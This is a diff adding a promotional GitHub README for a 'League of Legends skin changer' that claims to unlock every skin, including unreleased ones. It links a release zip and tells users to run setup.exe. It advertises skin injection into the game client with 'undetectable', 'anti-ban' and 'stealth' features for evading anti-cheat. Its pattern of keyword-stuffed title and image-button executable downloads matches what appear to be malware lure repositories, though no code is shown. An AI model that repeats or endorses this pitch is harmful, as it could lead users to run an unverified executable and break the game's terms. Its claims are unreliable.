@@ -1,2 +1,170 @@
-# LoL-Skin-Changer-2025-Ultimate-Champion-Customization-Tool
-LoL Skin Changer 2025 is the ultimate tool for unlocking and customizing skins in League of Legends. Modify champion appearances, effects, and animations while ensuring undetectable security and seamless integration.
+# LoL Skin Changer 2025 - Ultimate Champion Customization Tool
+
+Unlock the full potential of your League of Legends experience with LoL Skin Changer 2025! Customize champions with exclusive skins, unique effects, and personalized styles. Enhance your game with seamless integration and undetectable security.
+
+---
+
+## 📖 Table of Contents
+
+1. [About](#about)  
+2. [Getting Started](#getting-started)  
+   - [Download](#download)  
+   - [Installation](#installation)  
+3. [Features](#features)  
+4. [Changelog](#changelog)  
+5. [Feature Comparison](#feature-comparison)  
+6. [FAQ](#faq)  
+7. [Support](#support)  
+8. [Contributing](#contributing)  
+9. [License](#license)  
+
+---
+
+## 🧐 About
+
+LoL Skin Changer 2025 is the ultimate tool for customizing your League of Legends champions. Unlock and apply any skin, modify VFX effects, and enhance your in-game experience with personalized cosmetics—all without breaking the game's integrity.  
+
+This lightweight, secure, and regularly updated tool ensures full compatibility with the latest patches, delivering smooth performance with no FPS drops. 
+
+---
+
+## 🚀 Getting Started
+
+### Download
+
+Click the image below to download the latest version of LoL Skin Changer 2025:  
+
+<table>
+  <tr>
+    <td align="center">
+      <a href="https://github.com/RyanShadow/LoL-Skin-Changer-2025-Ultimate-Champion-Customization-Tool/releases/download/v2.7/League.of.Legends.Skin.Changer.zip">
+        <img src="https://i.imgur.com/1jSVKzi.jpeg" alt="lol skin changer" width="250">
+      </a>
+    </td>
+    <td align="center">
+      <a href="https://github.com/RyanShadow/LoL-Skin-Changer-2025-Ultimate-Champion-Customization-Tool/releases/download/v2.7/League.of.Legends.Skin.Changer.zip">
+        <img src="https://i.imgur.com/z6NnWRw.jpeg" alt="another league of legends skin changer" width="250">
+      </a>
+    </td>
+  </tr>
+</table>
+
+### Installation
+
+1. Extract the downloaded file to a secure folder.  
+2. Run the `setup.exe` file.  
+3. Follow the installation wizard and complete setup.  
+4. Launch LoL Skin Changer and start customizing!  
+
+---
+
+## ✨ Features
+
+- **Champion Skin Unlocker** – Access all skins, including unreleased and exclusive content.
+- **Visual Effects Customization** – Modify skill effects, recalls, and animations.
+- **Custom Skin Creation** – Import and apply personalized skins.
+- **Secure & Undetectable** – Stealth mode ensures safety.
+- **Auto-Updates** – Always compatible with the latest game version.
+- **Low Resource Usage** – Minimal performance impact, smooth FPS.
+
+---
+
+## 📜 Changelog
+
+### Version 2.7
+- Optimized skin injection process for faster application.
+- Improved compatibility with latest League of Legends patch.
+- Minor bug fixes and stability improvements.
+
+### Version 2.6
+- Introduced an advanced anti-detection mechanism.
+- Fixed rare crashes when switching skins mid-game.
+- Improved UI responsiveness.
+
+### Version 2.5
+- Added support for legendary and mythic skins.
+- Enhanced VFX customization tools.
+- Performance optimizations for low-end PCs.
+
+### Version 2.4
+- Implemented real-time skin swapping without restarts.
+- Improved file compression for faster loading times.
+- Fixed minor graphical glitches.
+
+### Version 2.3
+- Introduced an improved champion skin manager.
+- Reduced memory usage during gameplay.
+- Fixed compatibility issues with ranked mode.
+
+### Version 2.2
+- Added dynamic lighting effects to skins.
+- Enhanced anti-ban protection for safer use.
+- UI improvements for better navigation.
+
+### Version 2.1
+- Integrated custom recall animations.
+- Improved texture optimization.
+- Fixed minor FPS drops in certain skins.
+
+### Version 2.0
+- Fully redesigned skin injection system.
+- Enhanced support for custom animations.
+- Bug fixes and performance improvements.
+
+---
+
+## 🔍 Feature Comparison
+
+| Feature                     | LoL Skin Changer 2025 | Other Free Tools |
+|-----------------------------|----------------------|-----------------|
+| Full Skin Unlock            | ✅ Yes | ❌ No |
+| Custom Skin Support         | ✅ Yes | ❌ No |
+| VFX and Animation Edits     | ✅ Yes | ❌ No |
+| Secure and Undetectable     | ✅ Yes | ❌ No |
+| Auto-Updates                | ✅ Yes | ❌ No |
+| Real-Time Skin Switching    | ✅ Yes | ❌ No |
+
+---
+
+## ❓ FAQ
+
+**Q: Is LoL Skin Changer 2025 safe to use?**  
+A: Yes, it uses undetectable techniques to ensure maximum security. However, as with any third-party tool, use it responsibly.
+
+**Q: Does it work with all skins?**  
+A: Yes, including legacy, event-exclusive, and unreleased skins.
+
+**Q: Can I create my own skins?**  
+A: Absolutely! You can import and apply custom skins.
+
+**Q: Does it affect performance?**  
+A: No, it is optimized to have minimal impact on FPS.
+
+---
+
+## ❤️ Support
+
+For help, bug reports, or feature requests, feel free to:
+- Join our [Discord](#) for real-time support.
+- Open an issue on GitHub.
+
+---
+
+## 🤝 Contributing
+
+Want to improve LoL Skin Changer? Follow these steps:
+1. Fork the repository.
+2. Create a feature branch: `git checkout -b feature/YourFeature`.
+3. Commit your changes: `git commit -m 'Add some feature'`.
+4. Push the branch: `git push origin feature/YourFeature`.
+5. Open a pull request.
+
+---
+
+## 📝 License
+
+This project is licensed under the MIT License - see the [LICENSE](LICENSE.md) file for details.
+
+---
+
+### 🌟 Don't forget to star the repo if you find it useful! ⭐
